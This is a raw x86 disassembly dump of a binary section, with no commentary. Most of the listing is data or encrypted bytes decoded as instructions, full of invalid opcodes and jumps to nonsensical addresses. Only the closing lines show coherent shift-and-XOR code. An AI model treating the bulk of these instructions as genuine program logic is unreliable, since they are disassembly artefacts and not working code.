  41c17f:	sbb    al,0x66
  41c181:	aas    
  41c182:	inc    esp
  41c183:	jg     0x41c18a
  41c185:	mov    edx,0x42ca5fd1
  41c18a:	xchg   ebx,eax
  41c18b:	scas   al,BYTE PTR es:[edi]
  41c18c:	fwait
  41c18d:	js     0x41c1c0
  41c18f:	lds    esp,FWORD PTR [ebx-0x36]
  41c192:	pop    edi
  41c193:	(bad)  
  41c194:	cwde   
  41c195:	dec    esp
  41c196:	dec    ebp
  41c197:	sub    esi,DWORD PTR [ecx+esi*2-0x1b519235]
  41c19e:	int    0x35
  41c1a0:	ficom  DWORD PTR ds:0x3a8008ec
  41c1a6:	lahf   
  41c1a7:	cmp    DWORD PTR [ecx-0x77],esi
  41c1aa:	out    dx,eax
  41c1ab:	xlat   BYTE PTR ds:[ebx]
  41c1ac:	fadd   QWORD PTR [ebp+0x3a]
  41c1af:	dec    ebx
  41c1b0:	or     ecx,esp
  41c1b2:	dec    eax
  41c1b3:	dec    edx
  41c1b4:	cmp    bh,al
  41c1b6:	and    BYTE PTR ds:0x3985a3d6,0x2e
  41c1bd:	push   0x9af5c0a3
  41c1c2:	xchg   edx,eax
  41c1c3:	add    al,0xb2
  41c1c5:	pop    ecx
  41c1c6:	aad    0x7f
  41c1c8:	out    0x8e,eax
  41c1ca:	and    eax,DWORD PTR [ebp-0x5516d4f6]
  41c1d0:	lock or DWORD PTR ds:0xd445172,eax
  41c1d7:	inc    esi
  41c1d8:	jmp    0x49f4:0xa6f0594f
  41c1df:	out    dx,eax
  41c1e0:	sub    DWORD PTR [edx+esi*4-0x78d5fbc3],ecx
  41c1e7:	mov    bh,0x50
  41c1e9:	mov    bh,BYTE PTR [edi+0x7f081b1d]
  41c1ef:	jp     0x41c1f6
  41c1f1:	rsm    
  41c1f3:	jns    0x41c189
  41c1f5:	test   al,0x98
  41c1f7:	jae    0x41c1ea
  41c1f9:	sub    ebp,DWORD PTR [edi-0x74689ef5]
  41c1ff:	jg     0x41c24e
  41c201:	(bad)
  41c206:	call   0x1f51241d
  41c20b:	popf   
  41c20c:	icebp  
  41c20d:	jmp    0x635582fd
  41c212:	adc    eax,0xafd59fca
  41c217:	push   ss
  41c218:	(bad)  
  41c21a:	aas    
  41c21b:	je     0x41c209
  41c21d:	rcl    DWORD PTR [edi-0x6e13306d],cl
  41c223:	(bad)  
  41c224:	icebp  
  41c225:	cmp    esp,ebp
  41c227:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c228:	ror    esi,cl
  41c22a:	add    ebp,esp
  41c22c:	out    0xcc,eax
  41c22e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c22f:	in     eax,0x46
  41c231:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c232:	push   esp
  41c233:	jge    0x41c26f
  41c235:	sub    ecx,DWORD PTR [ecx+0x3a]
  41c238:	inc    esp
  41c239:	imul   ebp,DWORD PTR [eax+0x44],0x5295c0a2
  41c240:	xchg   DWORD PTR [ebp-0x7aa344e6],edi
  41c246:	push   ds
  41c247:	push   edx
  41c248:	loope  0x41c296
  41c24a:	cmp    BYTE PTR [edi+0x31],ah
  41c24d:	push   eax
  41c24e:	mov    al,0xfc
  41c250:	fucomip st,st(3)
  41c252:	sub    dh,ch
  41c254:	pop    esp
  41c255:	loope  0x41c2b2
  41c257:	in     eax,dx
  41c258:	fdiv   QWORD PTR [ecx-0x15864fe3]
  41c25e:	jo     0x41c26e
  41c260:	adc    al,0x43
  41c262:	pop    eax
  41c263:	jle    0x41c2e3
  41c265:	sbb    al,0xfd
  41c267:	dec    edi
  41c268:	sub    al,0xee
  41c26a:	retf   
  41c26b:	and    BYTE PTR [edi+esi*1],al
  41c26e:	es addr16 daa 
  41c271:	xchg   esi,eax
  41c272:	inc    esp
  41c273:	out    dx,al
  41c274:	(bad)  [edi]
  41c276:	sbb    BYTE PTR [esi-0x1e4809ab],cl
  41c27c:	iret   
  41c27d:	les    esp,FWORD PTR [edx+0xa07a781]
  41c283:	aam    0xe1
  41c285:	cld    
  41c286:	pushf  
  41c287:	cs push ds
  41c289:	fcomip st,st(2)
  41c28b:	adc    DWORD PTR [eax-0x22],eax
  41c28e:	pushw  ds
  41c290:	inc    ebp
  41c291:	mov    bl,0xc6
  41c293:	adc    esp,DWORD PTR [ebx+0x56]
  41c296:	btc    DWORD PTR [esp+ebx*2+0x7dd9321f],esi
  41c29e:	into   
  41c29f:	and    BYTE PTR [edi+edi*1],0x60
  41c2a3:	push   esp
  41c2a4:	(bad)  
  41c2a5:	jle    0x41c2f6
  41c2a7:	fwait
  41c2a8:	jg     0x41c277
  41c2aa:	jbe    0x41c279
  41c2ac:	popa   
  41c2ad:	ret    0xd03b
  41c2b0:	dec    esp
  41c2b1:	xchg   ebx,eax
  41c2b2:	and    cl,0x76
  41c2b5:	pop    ebp
  41c2b6:	or     edx,DWORD PTR [ebp+0x62a85ddc]
  41c2bc:	aas    
  41c2bd:	dec    ecx
  41c2be:	push   es
  41c2bf:	mov    DWORD PTR es:[ecx-0x37824dcb],edx
  41c2c6:	stc    
  41c2c7:	mov    esp,0xd179a355
  41c2cc:	leave  
  41c2cd:	cmp    BYTE PTR [ecx],dl
  41c2cf:	inc    edi
  41c2d0:	push   ss
  41c2d1:	shl    BYTE PTR [ebx-0x13],cl
  41c2d4:	das    
  41c2d5:	or     ebx,ebx
  41c2d7:	dec    ecx
  41c2d8:	dec    edx
  41c2d9:	fadd   DWORD PTR [esi]
  41c2db:	push   eax
  41c2dc:	mov    eax,ds:0x31f220a5
  41c2e1:	out    dx,al
  41c2e2:	stos   BYTE PTR es:[edi],al
  41c2e3:	xchg   ebp,eax
  41c2e4:	pop    eax
  41c2e5:	or     ebp,ecx
  41c2e7:	xor    eax,0x7a51f91
  41c2ec:	mov    ds:0xf80d255,al
  41c2f1:	(bad)  
  41c2f2:	mov    ah,0xe4
  41c2f4:	sbb    al,cl
  41c2f6:	stos   BYTE PTR es:[edi],al
  41c2f7:	jo     0x41c2e3
  41c2f9:	xchg   esp,eax
  41c2fa:	mov    dh,0xde
  41c2fc:	jb     0x41c2cc
  41c2fe:	push   edi
  41c2ff:	fldcw  WORD PTR [ecx]
  41c301:	sbb    eax,0xb556d383
  41c306:	ret    0x8d9
  41c309:	(bad)  
  41c30a:	call   0x40794b6a
  41c30f:	imul   ebx,ebx,0xffffffed
  41c312:	xor    ch,BYTE PTR [ebp-0x77]
  41c315:	push   ds
  41c316:	jb     0x41c2c9
  41c318:	ret    0x8e75
  41c31b:	leave  
  41c31c:	int3   
  41c31d:	add    al,0x65
  41c31f:	call   0x34a4:0x12e1589e
  41c326:	dec    ebp
  41c327:	scas   al,BYTE PTR es:[edi]
  41c328:	nop
  41c329:	retf   
  41c32a:	inc    esi
  41c32b:	scas   eax,DWORD PTR es:[edi]
  41c32c:	fcomi  st,st(5)
  41c32e:	add    al,0xe8
  41c330:	jge    0x41c32d
  41c332:	cmp    eax,0xadda733c
  41c337:	xor    DWORD PTR [ecx],0x9ea14f9
  41c33d:	or     ebp,DWORD PTR [edx-0x32]
  41c340:	or     eax,DWORD PTR [eax]
  41c342:	ficomp DWORD PTR ds:0x60fcfec0
  41c348:	rol    BYTE PTR [edx],0x9
  41c34b:	and    bh,bl
  41c34d:	test   DWORD PTR [esi],0xf3a61969
  41c353:	mov    ebx,0x5a46e006
  41c358:	add    eax,0xa81f161c
  41c35d:	ins    BYTE PTR es:[edi],dx
  41c35e:	dec    ebx
  41c35f:	sub    DWORD PTR fs:[ecx],ecx
  41c362:	popf   
  41c363:	and    al,0x49
  41c365:	sub    BYTE PTR ds:[edx],ch
  41c368:	and    al,0x51
  41c36a:	mov    ecx,0xabf160e4
  41c36f:	mov    BYTE PTR [ebx+eax*2-0x42c36037],dl
  41c376:	jno    0x41c3c8
  41c378:	aaa    
  41c379:	outs   dx,BYTE PTR ds:[esi]
  41c37a:	cmp    DWORD PTR [edx],ecx
  41c37c:	or     al,0x79
  41c37e:	inc    edi
  41c37f:	enter  0xe4e1,0x8f
  41c383:	dec    ebx
  41c384:	add    DWORD PTR [edi-0x3d],edx
  41c387:	aad    0x22
  41c389:	enter  0x329a,0x34
  41c38d:	scas   al,BYTE PTR es:[edi]
  41c38e:	(bad)  
  41c38f:	repnz mov ah,0xe5
  41c392:	jle    0x41c3ae
  41c394:	adc    DWORD PTR ds:[ebp-0x7b],ebp
  41c398:	xor    dl,BYTE PTR [eax]
  41c39a:	mov    al,ds:0xd2631f76
  41c39f:	or     DWORD PTR [ebp-0x17699d4f],0x75
  41c3a6:	mov    dl,0xe9
  41c3a8:	dec    esp
  41c3a9:	dec    esi
  41c3aa:	imul   edx,DWORD PTR [esi+0x5e],0xffffff87
  41c3ae:	(bad)  
  41c3af:	mov    cl,0x1b
  41c3b1:	adc    eax,0x50dcfbc5
  41c3b6:	lods   eax,DWORD PTR ds:[esi]
  41c3b7:	imul   ecx,DWORD PTR [ecx-0x3f106fe],0x6
  41c3be:	fild   QWORD PTR [edx-0x23885c28]
  41c3c4:	in     eax,0x49
  41c3c6:	ss mov ecx,0x54f40ee1
  41c3cc:	mov    bh,bh
  41c3ce:	inc    ebx
  41c3cf:	mov    ds:0x9d529db9,eax
  41c3d4:	jl     0x41c3a7
  41c3d6:	sub    eax,0x4d180107
  41c3db:	inc    ebp
  41c3dc:	ror    BYTE PTR [eiz*4-0x41265b61],1
  41c3e3:	sub    eax,0xffffff8c
  41c3e6:	out    dx,eax
  41c3e7:	jno    0x41c3fc
  41c3e9:	mov    dh,0xa5
  41c3eb:	and    ch,BYTE PTR [esi]
  41c3ed:	dec    ebx
  41c3ee:	fnstenv [edi+0x21ae20e4]
  41c3f4:	in     eax,0xcc
  41c3f6:	add    DWORD PTR [ebx+0x7f],0xaa908e8b
  41c3fd:	sub    bl,ah
  41c3ff:	js     0x41c414
  41c401:	xchg   edx,eax
  41c402:	jmp    0x324f:0xe29614e8
  41c409:	xchg   BYTE PTR [ebp+0x3e70defa],dh
  41c40f:	push   0xffffffa0
  41c411:	dec    esi
  41c412:	jne    0x41c443
  41c414:	test   BYTE PTR [ebp-0x30],ah
  41c417:	pusha  
  41c418:	push   eax
  41c419:	pop    edi
  41c41a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c41b:	inc    esi
  41c41c:	inc    ecx
  41c41d:	mov    ds:0xe84a4654,eax
  41c422:	push   esp
  41c423:	jmp    0xd8a45f87
  41c428:	mov    ebp,0xe7bbea0c
  41c42d:	push   ebx
  41c42e:	push   es
  41c42f:	daa    
  41c430:	out    0x3,al
  41c432:	out    dx,eax
  41c433:	cmp    bl,BYTE PTR [ebx-0x35]
  41c436:	hlt    
  41c437:	dec    ecx
  41c438:	test   eax,0xd62cbfe9
  41c43d:	ins    DWORD PTR es:[edi],dx
  41c43e:	(bad)  
  41c43f:	ds ins DWORD PTR es:[edi],dx
  41c441:	inc    ebp
  41c442:	xchg   BYTE PTR [eax+0x58],cl
  41c445:	cli    
  41c446:	jne    0x41c4a7
  41c448:	fdivr  QWORD PTR [ebx+ebp*8+0x49]
  41c44c:	sbb    BYTE PTR [esi-0x7d195837],al
  41c452:	jp     0x41c41a
  41c454:	imul   ecx,DWORD PTR [esi],0xf65909e
  41c45a:	daa    
  41c45b:	sub    BYTE PTR [edx-0x36],bh
  41c45e:	arpl   WORD PTR [ebp-0x6e],dx
  41c461:	les    ebx,FWORD PTR [ebx]
  41c463:	sbb    ah,BYTE PTR ds:0x4f22e5cd
  41c469:	inc    esi
  41c46a:	push   ss
  41c46b:	std    
  41c46c:	mov    ecx,DWORD PTR [ebp+0x43f7181f]
  41c472:	mov    ch,0xab
  41c474:	xchg   ebx,eax
  41c475:	mov    WORD PTR [edx],ds
  41c477:	ins    DWORD PTR es:[edi],dx
  41c478:	and    DWORD PTR ds:0x88a8c99f,esi
  41c47e:	aas    
  41c47f:	js     0x41c4a7
  41c481:	retf   
  41c482:	cmp    DWORD PTR [edi],edi
  41c484:	and    DWORD PTR [esi+0x22],esi
  41c487:	ds mov bh,0xd1
  41c48a:	cld    
  41c48b:	call   0xcf5210fc
  41c490:	into   
  41c491:	sbb    BYTE PTR [eax-0x7c],cl
  41c494:	sub    esi,DWORD PTR [edx+ebx*4+0x8]
  41c498:	lods   eax,DWORD PTR ds:[esi]
  41c499:	jecxz  0x41c4a2
  41c49b:	mov    edi,0x793a1b34
  41c4a0:	shr    bl,1
  41c4a2:	inc    edx
  41c4a3:	ret    0xfcf5
  41c4a6:	lds    ebp,FWORD PTR [ebp+0x36]
  41c4a9:	shl    ch,0xe5
  41c4ac:	push   edx
  41c4ad:	dec    ebp
  41c4ae:	cmp    al,0x62
  41c4b0:	neg    BYTE PTR [ecx+0x1ce80bd0]
  41c4b6:	mov    edi,edi
  41c4b8:	(bad)  
  41c4b9:	jmp    0x41c888
  41c4be:	inc    edi
  41c4bf:	and    edi,DWORD PTR [eax]
  41c4c1:	sbb    DWORD PTR [ebx+eax*1],esi
  41c4c4:	daa    
  41c4c5:	and    cl,BYTE PTR [ebx]
  41c4c7:	cdq    
  41c4c8:	lahf   
  41c4c9:	jo     0x41c4cd
  41c4cb:	gs lahf 
  41c4cd:	jo     0x41c519
  41c4cf:	jae    0x41c4e7
  41c4d1:	sbb    BYTE PTR [edx+edx*1+0x2c171818],bh
  41c4d8:	xor    dh,BYTE PTR [eax]
  41c4da:	push   edi
  41c4db:	retf   
  41c4dc:	inc    esi
  41c4dd:	push   esp
  41c4de:	mov    eax,ds:0xc6d55f3c
  41c4e3:	hlt    
  41c4e4:	sub    edi,DWORD PTR [eax]
  41c4e6:	pop    ebp
  41c4e7:	addr16 push eax
  41c4e9:	sar    esp,cl
  41c4eb:	mov    edx,0x78875c9c
  41c4f0:	push   es
  41c4f1:	dec    edi
  41c4f2:	jecxz  0x41c55c
  41c4f4:	ja     0x41c4a1
  41c4f6:	mov    ebp,0xccb1d6e9
  41c4fb:	jne    0x41c491
  41c4fd:	cmp    BYTE PTR [edi+0x13],dh
  41c500:	push   edi
  41c501:	mov    ecx,0xb11fea16
  41c506:	jnp    0x41c580
  41c508:	xor    eax,0x2a93b098
  41c50d:	and    eax,0xdc88a4d8
  41c512:	xor    dl,al
  41c514:	push   edx
  41c515:	push   ebp
  41c516:	and    al,0x19
  41c518:	aas    
  41c519:	nop
  41c51a:	call   0x24f0:0x57cc03c7
  41c521:	rcl    al,1
  41c523:	into   
  41c524:	pop    es
  41c525:	fstp   QWORD PTR [ebp-0x4bdd0fca]
  41c52b:	push   ss
  41c52c:	shl    DWORD PTR [eax+0x5473c2d6],cl
  41c532:	jmp    0xa42e:0x400930f8
  41c539:	lods   al,BYTE PTR ds:[esi]
  41c53a:	in     eax,0x4c
  41c53c:	push   ss
  41c53d:	fwait
  41c53e:	mov    dl,0x3e
  41c540:	xor    eax,0xbd1f9a81
  41c545:	mov    BYTE PTR [eax+0x38729e3b],ch
  41c54b:	push   cs
  41c54c:	xchg   ebx,eax
  41c54d:	push   esi
  41c54e:	loop   0x41c59d
  41c550:	(bad)
  41c554:	mov    es,ecx
  41c556:	cmp    edx,DWORD PTR [esi]
  41c558:	xor    eax,esi
  41c55a:	fnstsw WORD PTR fs:[edi]
  41c55d:	jno    0x41c4e7
  41c55f:	into   
  41c560:	and    BYTE PTR [esp+edx*1+0x6a041f8a],dh
  41c567:	aas    
  41c568:	push   edi
  41c569:	inc    edx
  41c56a:	(bad)  
  41c56b:	dec    ebp
  41c56c:	ds pop edx
  41c56e:	fistp  DWORD PTR [ecx-0x4]
  41c571:	cwde   
  41c572:	lds    ebx,FWORD PTR [eax+0x17]
  41c575:	push   esp
  41c576:	popa   
  41c577:	scas   al,BYTE PTR es:[edi]
  41c578:	jns    0x41c5bf
  41c57a:	mov    esi,0x5f9a795f
  41c57f:	mov    al,ds:0x475485bc
  41c584:	jne    0x41c57c
  41c586:	push   ds
  41c587:	mov    al,0x3
  41c589:	std    
  41c58a:	sub    al,0xcb
  41c58c:	mov    cl,0xc
  41c58e:	push   dx
  41c590:	mov    cl,0xfe
  41c592:	addr16 das 
  41c594:	mov    bh,0xbc
  41c596:	mov    ecx,0xa8d53e32
  41c59b:	enter  0xe143,0xa5
  41c59f:	mov    bl,0x3
  41c5a1:	xchg   edx,eax
  41c5a2:	pusha  
  41c5a3:	das    
  41c5a4:	and    al,0x99
  41c5a6:	mov    ebx,0x6b28c135
  41c5ab:	pusha  
  41c5ac:	pop    ss
  41c5ad:	mov    esp,0x9c376f7
  41c5b2:	jo     0x41c551
  41c5b4:	xor    eax,0xae7b948f
  41c5b9:	cmc    
  41c5ba:	inc    eax
  41c5bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c5bc:	ss loop 0x41c553
  41c5bf:	outs   dx,BYTE PTR ds:[esi]
  41c5c0:	sbb    al,0xea
  41c5c2:	loopne 0x41c5de
  41c5c4:	xchg   di,ax
  41c5c6:	sbb    cl,dl
  41c5c8:	(bad)  
  41c5c9:	pop    edi
  41c5ca:	cmc    
  41c5cb:	mov    ds:0xd9f234a1,al
  41c5d0:	scas   al,BYTE PTR es:[edi]
  41c5d1:	and    DWORD PTR [edi+0x502e2556],edi
  41c5d7:	adc    cl,BYTE PTR [ebx+eiz*4-0x3c]
  41c5db:	fidiv  WORD PTR ds:0xb2b754c2
  41c5e1:	cmp    DWORD PTR [ebp+edi*4+0x46fca4ad],0x67
  41c5e9:	ss (bad) 
  41c5eb:	jns    0x41c58b
  41c5ed:	or     al,0x90
  41c5ef:	mov    dl,0x8
  41c5f1:	mov    esp,0xc38506bf
  41c5f6:	ficomp DWORD PTR [ebx+0x4a04a6e3]
  41c5fc:	in     al,dx
  41c5fd:	and    al,0xd7
  41c5ff:	push   0x49a938c8
  41c604:	adc    ecx,edi
  41c606:	push   0x2f0f1248
  41c60b:	push   ebp
  41c60c:	rcr    DWORD PTR ds:0xc30417c,1
  41c612:	xchg   DWORD PTR [ecx],esp
  41c614:	retf   
  41c615:	sbb    edi,DWORD PTR [esi+edi*4]
  41c618:	jecxz  0x41c63b
  41c61a:	cmp    esi,DWORD PTR [ecx+0x1906c853]
  41c620:	jne    0x41c68f
  41c622:	mov    al,al
  41c624:	cmp    dh,BYTE PTR [esi-0x44]
  41c627:	call   0xb498ffb6
  41c62c:	pop    ss
  41c62d:	sub    esi,DWORD PTR [bp-0x63f6]
  41c632:	(bad)  
  41c633:	cmp    edx,DWORD PTR [edi+edx*8-0x5c]
  41c637:	retf   0x561
  41c63a:	or     eax,0x98ff6b2e
  41c63f:	out    dx,al
  41c640:	fwait
  41c641:	mov    ss,WORD PTR [ecx+0x7370a47d]
  41c647:	push   eax
  41c648:	outs   dx,BYTE PTR ds:[esi]
  41c649:	xchg   edi,eax
  41c64a:	out    dx,eax
  41c64b:	icebp  
  41c64c:	in     eax,dx
  41c64d:	sbb    DWORD PTR [ecx-0x20949e35],esi
  41c653:	fxch   st(5)
  41c655:	lea    ebx,[edx-0x53ad71ad]
  41c65b:	call   0x3d6d9c7f
  41c660:	inc    ebp
  41c661:	xchg   DWORD PTR [edx+0x32],ecx
  41c664:	pushf  
  41c665:	je     0x41c690
  41c667:	retf   
  41c668:	cli    
  41c669:	push   cs
  41c66a:	pop    ds
  41c66b:	scas   eax,DWORD PTR es:[edi]
  41c66c:	out    0x33,al
  41c66e:	test   eax,0x40e9d193
  41c673:	jp     0x41c616
  41c675:	mov    eax,ds:0x51ee219a
  41c67a:	push   0x47
  41c67c:	push   0xffffffa9
  41c67e:	inc    ecx
  41c67f:	cmp    DWORD PTR [ebx-0x520ead4],eax
  41c685:	jns    0x41c657
  41c687:	(bad)  
  41c689:	pop    ebx
  41c68a:	adc    al,BYTE PTR [ecx]
  41c68c:	fistp  DWORD PTR [edx+0x56]
  41c68f:	bound  esi,QWORD PTR ds:0x565a77cd
  41c695:	sbb    DWORD PTR [edx],esp
  41c697:	fwait
  41c698:	sub    eax,0x75d51616
  41c69d:	xchg   ebx,eax
  41c69e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c69f:	xlat   BYTE PTR ds:[ebx]
  41c6a0:	push   ds
  41c6a1:	sub    al,0x3b
  41c6a3:	dec    esp
  41c6a4:	test   cl,cl
  41c6a6:	mov    bh,ch
  41c6a8:	fs retf 0xc588
  41c6ac:	dec    esp
  41c6ad:	outs   dx,BYTE PTR ds:[esi]
  41c6ae:	inc    esi
  41c6af:	int3   
  41c6b0:	sbb    ch,cl
  41c6b2:	js     0x41c6d6
  41c6b4:	in     al,0xd
  41c6b6:	pop    eax
  41c6b7:	lods   al,BYTE PTR ds:[esi]
  41c6b8:	rcr    DWORD PTR [ebp+ecx*4-0x467b55e2],0x65
  41c6c0:	popf   
  41c6c1:	fwait
  41c6c2:	push   ds
  41c6c3:	cmp    eax,0x3ea4187b
  41c6c8:	lahf   
  41c6c9:	rcr    DWORD PTR [ebx-0x9],1
  41c6cc:	loopne 0x41c677
  41c6ce:	in     al,dx
  41c6cf:	(bad)
  41c6d2:	(bad)  
  41c6d3:	es pop ecx
  41c6d5:	xor    edi,ebx
  41c6d7:	es jne 0x41c66c
  41c6da:	call   0xcc1d:0xb2b3e995
  41c6e1:	add    DWORD PTR [esi],esp
  41c6e3:	push   esp
  41c6e4:	mov    eax,ds:0x2e769373
  41c6e9:	in     al,0x39
  41c6eb:	jae    0x41c671
  41c6ed:	jo     0x41c71a
  41c6ef:	and    esi,DWORD PTR [edi]
  41c6f1:	sahf   
  41c6f2:	sub    edx,DWORD PTR [esi-0x74ab130d]
  41c6f8:	fwait
  41c6f9:	and    ecx,eax
  41c6fb:	outs   dx,BYTE PTR ds:[esi]
  41c6fc:	mov    ebp,0xa03cbb5b
  41c701:	popf   
  41c702:	jb     0x41c728
  41c704:	mov    ch,0x50
  41c706:	jae    0x41c76f
  41c708:	adc    ebx,ebp
  41c70a:	ins    BYTE PTR es:[edi],dx
  41c70b:	mov    ds:0xf8046bea,eax
  41c710:	enter  0xd9ff,0x54
  41c714:	out    dx,eax
  41c715:	cmp    bh,bl
  41c717:	cmp    BYTE PTR [eax-0x784f9cb8],dl
  41c71d:	inc    edx
  41c71e:	int    0xf8
  41c720:	xchg   esp,eax
  41c721:	mov    ebx,0xe1f044c5
  41c726:	scas   al,BYTE PTR es:[edi]
  41c727:	loop   0x41c75b
  41c729:	inc    ebx
  41c72a:	repnz pop ebp
  41c72c:	mov    al,0x6c
  41c72e:	ins    BYTE PTR es:[edi],dx
  41c72f:	dec    ecx
  41c730:	jecxz  0x41c793
  41c732:	or     eax,0x5d11a442
  41c737:	mov    eax,ds:0x6185a5b6
  41c73c:	jmp    0x50939cd0
  41c741:	pop    esi
  41c742:	cmp    al,0x28
  41c744:	jae    0x41c713
  41c746:	xchg   edx,eax
  41c747:	les    esi,FWORD PTR [edx]
  41c749:	or     bh,ch
  41c74b:	scas   eax,DWORD PTR es:[edi]
  41c74c:	fxch   st(6)
  41c74e:	dec    esp
  41c74f:	(bad)  
  41c750:	fild   WORD PTR [ecx-0x80]
  41c753:	mov    esp,0x803428e6
  41c758:	cmp    DWORD PTR [ebx+ebp*2+0x3e],ebp
  41c75c:	in     al,dx
  41c75d:	or     bh,bh
  41c75f:	scas   al,BYTE PTR es:[edi]
  41c760:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c761:	jne    0x41c794
  41c763:	(bad)  
  41c764:	pop    edx
  41c765:	mov    al,0x60
  41c767:	fmul   DWORD PTR [edx]
  41c769:	cdq    
  41c76a:	ins    BYTE PTR es:[edi],dx
  41c76b:	js     0x41c72d
  41c76d:	ror    BYTE PTR [ebp-0x3d],1
  41c770:	adc    edi,DWORD PTR [ebp+0xd]
  41c773:	sub    ecx,DWORD PTR [edi]
  41c775:	pop    eax
  41c776:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c777:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c778:	int    0x51
  41c77a:	jnp    0x41c7e9
  41c77c:	sbb    ebp,DWORD PTR [ebx+0x7e]
  41c77f:	rcl    bl,1
  41c781:	adc    edi,DWORD PTR [edx+edx*1]
  41c784:	addr16 jmp 0x41c784
  41c787:	mov    WORD PTR [eax],?
  41c789:	sbb    esi,DWORD PTR [ebp+0x2e29b095]
  41c78f:	fcmovu st,st(3)
  41c791:	jge    0x41c7ce
  41c793:	shl    BYTE PTR [eax-0x7e],0x78
  41c797:	sub    dl,ah
  41c799:	pop    esp
  41c79a:	cmp    ebp,eax
  41c79c:	repnz mov ch,0xbd
  41c79f:	cld    
  41c7a0:	popa   
  41c7a1:	push   es
  41c7a2:	test   BYTE PTR ds:0x8d405029,dh
  41c7a8:	mov    ebx,0x6b84ce92
  41c7ad:	in     al,dx
  41c7ae:	or     DWORD PTR [ecx+ebx*2-0x60],ebx
  41c7b2:	outs   dx,DWORD PTR ds:[esi]
  41c7b3:	mov    esi,0x686f4ccc
  41c7b8:	add    DWORD PTR [esi-0x1],0x41
  41c7bc:	pop    esi
  41c7bd:	in     eax,dx
  41c7be:	imul   ecx,DWORD PTR [edi-0x4f34e4cf],0x8579f26a
  41c7c8:	xchg   ebx,eax
  41c7c9:	(bad)  
  41c7ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c7cb:	and    al,0x67
  41c7cd:	jae    0x41c7fa
  41c7cf:	ret    
  41c7d0:	out    0x10,eax
  41c7d2:	xlat   BYTE PTR ds:[ebx]
  41c7d3:	sti    
  41c7d4:	cld    
  41c7d5:	nop
  41c7d6:	push   es
  41c7d7:	dec    ecx
  41c7d8:	pcmpeqw mm5,QWORD PTR [ebp-0x7d9b6e55]
  41c7df:	ss sub eax,esi
  41c7e2:	sub    dl,BYTE PTR [esi+0x1310a15e]
  41c7e8:	in     eax,0xd4
  41c7ea:	cmp    ch,BYTE PTR [ecx-0x5e]
  41c7ed:	movlps QWORD PTR [ebx+0x54],xmm6
  41c7f1:	xchg   ebx,eax
  41c7f2:	dec    edi
  41c7f3:	or     DWORD PTR [eax],ecx
  41c7f5:	mov    DWORD PTR [edi+0x428c5a33],ebx
  41c7fb:	inc    esi
  41c7fc:	repz popf 
  41c7fe:	pop    edi
  41c7ff:	pop    ecx
  41c800:	and    DWORD PTR [ecx+edx*1+0x49],0x36
  41c805:	push   edx
  41c806:	dec    ebp
  41c807:	pop    es
  41c808:	mov    esp,0xed2fb248
  41c80d:	or     BYTE PTR [ecx-0x3e30349a],bl
  41c813:	enter  0xf8b0,0x46
  41c817:	xor    al,0xf
  41c819:	and    BYTE PTR [edi],dl
  41c81b:	js     0x41c7af
  41c81d:	mov    ebp,0xb6f1e8f5
  41c822:	mov    bl,BYTE PTR [ebp-0x7edff6af]
  41c828:	add    eax,0x7f0ea56f
  41c82d:	outs   dx,BYTE PTR ds:[esi]
  41c82e:	pop    edi
  41c82f:	stc    
  41c830:	inc    eax
  41c831:	imul   ebx,DWORD PTR [edi],0xe8e8bb4f
  41c837:	jb     0x41c85d
  41c839:	mov    eax,ds:0x7e49291d
  41c83e:	imul   esi,DWORD PTR [ecx+ebx*8-0x31f45d2e],0xffffff8b
  41c846:	mov    DWORD PTR [esi],edi
  41c848:	jl     0x41c882
  41c84a:	xchg   ecx,eax
  41c84b:	cdq    
  41c84c:	pop    esp
  41c84d:	or     al,0xd8
  41c84f:	xchg   ebp,eax
  41c850:	out    0xc1,al
  41c852:	jbe    0x41c7e3
  41c854:	je     0x41c803
  41c856:	popa   
  41c857:	or     al,BYTE PTR [eax-0x645893ae]
  41c85d:	mov    ch,bl
  41c85f:	nop
  41c860:	xchg   edx,eax
  41c861:	push   es
  41c862:	fnstcw WORD PTR [eax]
  41c864:	hlt    
  41c865:	jl     0x41c8cd
  41c867:	mov    eax,0x44f77510
  41c86c:	and    BYTE PTR [edi],dl
  41c86e:	cmp    eax,0x2aecab3
  41c873:	pop    ecx
  41c874:	lea    ebx,[edi]
  41c876:	das    
  41c877:	int3   
  41c878:	push   ss
  41c879:	test   eax,0x914263ae
  41c87e:	adc    bl,BYTE PTR [esi+0xc30926b]
  41c884:	stos   BYTE PTR es:[edi],al
  41c885:	in     al,dx
  41c886:	inc    edi
  41c887:	cli    
  41c888:	push   DWORD PTR [esp+0x74]
  41c88c:	push   DWORD PTR [esp+0x74]
  41c890:	push   DWORD PTR [esp+0x24]
  41c894:	push   DWORD PTR [esp+0x24]
  41c898:	call   0x415a06
  41c89d:	mov    edx,DWORD PTR [esp+0x18]
  41c8a1:	mov    eax,DWORD PTR [esp+0x1c]
  41c8a5:	mov    ecx,DWORD PTR [esp+0x18]
  41c8a9:	mov    edi,DWORD PTR [esp+0x1c]
  41c8ad:	shrd   edx,eax,0x2
  41c8b1:	shr    eax,0x2
  41c8b4:	shl    ecx,0x1e
  41c8b7:	xor    ecx,ecx
  41c8b9:	mov    eax,0x329e695d
  41c8be:	xor    edx,eax
  41c8c0:	or     ecx,edx
  41c8c2:	mov    edx,DWORD PTR [esp+0x5c]
  41c8c6:	mov    DWORD PTR [edx],ecx
  41c8c8:	mov    ecx,DWORD PTR [esp+0x18]
  41c8cc:	mov    edx,DWORD PTR [esp+0x1c]
  41c8d0:	shrd   ecx,edx,0x2
  41c8d4:	xor    ecx,eax
  41c8d6:	mov    eax,DWORD PTR [esp+0x18]
  41c8da:	shl    eax,0x1e
  41c8dd:	shr    edx,0x2
  41c8e0:	mov    edx,DWORD PTR [esp+0x1c]
  41c8e4:	xor    eax,eax
  41c8e6:	or     eax,ecx
  41c8e8:	mov    ecx,DWORD PTR [esp+0x68]
  41c8ec:	mov    DWORD PTR [ecx],eax
  41c8ee:	mov    eax,DWORD PTR [esp+0x68]
